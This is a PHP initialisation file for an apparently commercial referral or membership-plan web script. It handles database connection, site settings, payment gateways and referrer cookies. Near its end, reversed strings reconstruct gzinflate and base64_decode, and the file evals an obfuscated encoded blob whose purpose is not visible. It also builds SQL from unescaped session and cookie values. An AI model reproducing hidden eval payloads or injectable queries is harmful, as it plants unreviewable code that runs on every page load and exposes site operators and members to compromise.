<?php

include_once('config.php');

if (!defined('INSTALL_PATH')) {
    define('INSTALL_PATH', '');
}

$setsesname = md5(DB_NAME . INSTALL_PATH);
session_name($setsesname);
session_start();

if (INSTALL_PATH == '') {
    header("Location: ../install");
}
if (!defined('OK_LOADME')) {
    die("<title>Error!</title><body>No such file or directory.</body>");
}

// -----

$FORM = array_merge((array) $FORM, (array) $_REQUEST);
$LANG = array_merge((array) $LANG, (array) $lang);

// database
include_once('db.func.php');

$dsn = "mysql:dbname=" . DB_NAME . ";host=" . DB_HOST . "";
$pdo = "";

try {
    $pdo = new PDO($dsn, base64_decode(DB_USER), base64_decode(DB_PASSWORD));
    $pdo->exec('SET CHARACTER SET utf8');
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

$db = new Database($pdo);
$db->doQueryStr("SET SESSION sql_mode = ''");

$tplstr = $cfgrow = $bpprow = $bpparr = $payrow = array();

// load site configuration
$didId = 1;

// settings
$row = $db->getAllRecords(DB_TBLPREFIX . '_configs', '*', ' AND cfgid = "' . $didId . '"');
foreach ($row as $value) {
    $cfgrow = array_merge($cfgrow, $value);
}
$cfgrow['md5sess'] = 'sess_' . md5(INSTALL_PATH) . '_';
$cfgrow['site_url'] = (defined('INSTALL_URL')) ? INSTALL_URL : trim($cfgrow['site_url']);
$site_logo = ($cfgrow['site_logo']) ? $cfgrow['site_logo'] : DEFIMG_LOGO;
$cfgtoken = get_optionvals($cfgrow['cfgtoken']);
$cfgrow['_isnocredit'] = (($cfgtoken['lictype'] != '2083' && $cfgtoken['licpk'] == '-') || ($cfgtoken['lictype'] == '2083' && $cfgtoken['licpk'] != '')) ? true : false;
$langlist = base64_decode($cfgtoken['langlist']);
$langlistarr = json_decode($langlist, true);
if (empty(array_filter((array) $langlistarr))) {
    $langlistarr['en'] = 'English';
}

// baseplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_baseplan', '*', ' AND bpid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}
$bpprow['currencysym'] = base64_decode($bpprow['currencysym']);
$bptoken = get_optionvals($bpprow['bptoken']);
$bpprowbase = $bpprow;

// payplan
$row = $db->getAllRecords(DB_TBLPREFIX . '_payplans', '*', ' AND ppid = "' . $didId . '"');
foreach ($row as $value) {
    $bpprow = array_merge($bpprow, $value);
}
$plantokenarr = get_optionvals($bpprow['plantoken']);
$planimg = ($bpprow['planimg']) ? $bpprow['planimg'] : DEFIMG_PLAN;
$planlogo = ($bpprow['planlogo']) ? $bpprow['planlogo'] : DEFIMG_LOGO;

// paymentgate
$row = $db->getAllRecords(DB_TBLPREFIX . '_paygates', '*', ' AND paygid = "' . $didId . '"');
foreach ($row as $value) {
    $payrow = array_merge($payrow, $value);
}

// navigator functions
include_once('navpage.class.php');
$pages = new Paginator();

// other functions
include_once('sys.func.php');
include_once('value.list.php');
include_once('en.lang.php');

// add access security layer
dumbtoken();
$bpparr = ppdbarr();

// current date time
$cfgrow['datestr'] = date('Y-m-d', time() + (3600 * $cfgrow['time_offset']));
$cfgrow['datetimestr'] = date('Y-m-d H:i:s', time() + (3600 * $cfgrow['time_offset']));

// language
$langloadf = INSTALL_PATH . '/common/lang/' . $cfgrow['langiso'] . '.lang.php';
if (file_exists($langloadf)) {
    $TEMPLANG = $LANG;
    include_once($langloadf);
    $LANG = array_filter($LANG);
    $LANG = array_merge($TEMPLANG, $LANG);
    $TEMPLANG = '';
}

// return latest version
if (isset($FORM['initdo']) && $FORM['initdo'] == 'vnum') {
    echo checknewver();
    exit();
}

// limit subadmin pages
if ($_SESSION['isunsubadm']) {
    $unsetadminpage_array = array(
        'generalcfg' => 1,
        'payplancfg' => 1,
        'paymentopt' => 1,
        'updates' => 1
    );
    $avaladminpage_array = \array_diff_key($avaladminpage_array, $unsetadminpage_array);
}

// get referrer id
$sesref = array();
do_isvaliver();
if ($_SESSION['ref_sess_un'] || $_COOKIE['ref_sess_un']) {

    if ($_SESSION['ref_sess_un'] != $_COOKIE['ref_sess_un']) {
        setcookie('ref_sess_un', $_SESSION['ref_sess_un'], time() + (86400 * $cfgrow['maxcookie_days']));
    }

    $ref_sess_un = ($_SESSION['ref_sess_un']) ? $_SESSION['ref_sess_un'] : $_COOKIE['ref_sess_un'];

    // get member details
    $sesref = getmbrinfo($ref_sess_un, 'username');

    // check for max personal ref
    if ($bpparr[$sesref['mppid']]['limitref'] > 0) {
        $refcondition = " AND idref = '{$sesref['id']}' AND mppid = '{$sesref['mppid']}'";
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans', 'COUNT(*) as totref', $refcondition);
        $myperdltotal = $row[0]['totref'];
        if ($bpparr[$sesref['mppid']]['limitref'] <= $myperdltotal) {
            $newmpid = getmpidflow($sesref['mpid'], $sesref['mppid'], $sesref);
            $sesref = getmbrinfo('', '', $newmpid);
        }
    }

    if ($cfgtoken['disreflink'] == 1 || $sesref['mpstatus'] == 0 || $sesref['mpstatus'] == 3) {
        $sesref = array();
        $_SESSION['ref_sess_un'] = '';
        setcookie('ref_sess_un', '', time() - 86400);
    }
}

// if rand ref
if ($sesref['id'] < 1 && $cfgrow['randref'] == 1) {
    $randun = '';
    if ($cfgrow['defaultref'] != '') {
        $refarr = explode(',', str_replace(' ', '', $cfgrow['defaultref']));
        $i = array_rand($refarr);
        $randun = $refarr[$i];
    }
    $condition = ' AND mbrstatus = "1" AND mpstatus = "1" AND username = "' . $randun . '" ';
    $sql = $db->getRecFrmQry("SELECT * FROM " . DB_TBLPREFIX . "_mbrplans LEFT JOIN " . DB_TBLPREFIX . "_mbrs ON idmbr = id WHERE 1 " . $condition . " LIMIT 1");
    if (count($sql) < 1) {
        $condition = ' AND mbrstatus = "1" AND mpstatus = "1" ORDER BY RAND() LIMIT 1';
        $row = $db->getAllRecords(DB_TBLPREFIX . '_mbrplans LEFT JOIN ' . DB_TBLPREFIX . '_mbrs ON idmbr = id', 'username', $condition);
        $randun = $row[0]['username'];
    }
    // get member details from rand ref
    if ($randun) {
        $sesref = getmbrinfo($randun, 'username');
        $_SESSION['ref_sess_un'] = $randun;
    }
}

// is demo
if (defined('ISDEMOMODE')) {
    $tplstr['demo_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Demo Mode</div></li></ul>";
}
// is debug
if ($payrow['testpayon'] == 1) {
    $tplstr['debug_mode_warn'] = "<ul class='navbar-nav'><li><div class='badge badge-danger'>Debug Mode</div></li></ul>";
}
$_X='lfnizg';$_Y='edoce';
$_F='eta'.$_X;$_E=$_Y.'d_46esab';
$_G=strrev($_F);$_D=strrev($_E);
$_Z='
FZFHbqtQAACv8heRnAgpPD/AYEVZUE2zTTVlE9F7r/bpf7KdWY3m7Yf9PkRJ/IOfkunw9fbDfx+SuDt8vv2wn4cg/EMc/j3N45is77/64ytZg/o9exVtWgdz8v7n3w9C1MrlINM0zekuUXMy7K955f
pgqThFyTqEIoWJMUb6IUl0TaHgnGJrf2pbAFiwJAYzaQ2CTD3a7DRsMCQtj1r6ig2UX9uNQjcjy68QRc7I5luMmhLO6PnljcgQdA1L3wTR7KraFUk5H2F9oppqRcaQGMcgL/bPxU5wC0cJssYqJJJE
qw4JS6G7gPDdOpLbF83wnpkgTniam/LoO/r1/jzp5CNJq6HCiZUdIdZa95qHBfMCJ1e/AgaZcdMB+2uMvZk6U8to1lyNqiTZWd1+rp68+HitjiFuNy120McxUdypdKGCXghCVkeFdJnGdDJ+II+sMD
SG7vmeDFz8xLS3rGmEFTEEaWDSGdjdSt0CThSztUaN3YsXN+nbhL/vg+xso3Whs3HsK/po2yzi8/GIDuW5nka2d8w7+7DkKalqPih5Koc8qXhLjya1EsWD28HH1c/5kqAadVtNPeTtm6OXQQx5l05v
AtUfJRNM2i0PCxO3bhIjU3vMSiEOCzpbW2neujSKJfyURsXlWYJZz03EtYK7gE27kZ8k7tJARbN/i2mV2UETVGZUAm/H42qKIHxN4lOeL50VDLRYulVnn26GK/K2F5lDdAGC5OfXh46SNijMGfjLgK
p6zKDCXKyoJmoCTbNrFsjW4s6X56vZcrLTKwZueqR5qog0Hbk4yB0Eo5ZS9u/c+Mm+YEhQ92YdxmzdHQ/dYQxaARTafBY2Q4L4Q3UqkywJMC+k2WfpEb8HNZNoG8blsPITLfQLMytE1pXsHB7hcsaw
FqO+Dx8fH1///gM=
';
eval($_G($_D($_Z)));

// load cron do
include_once('cron.do.php');

// end vars
$row = $value = '';
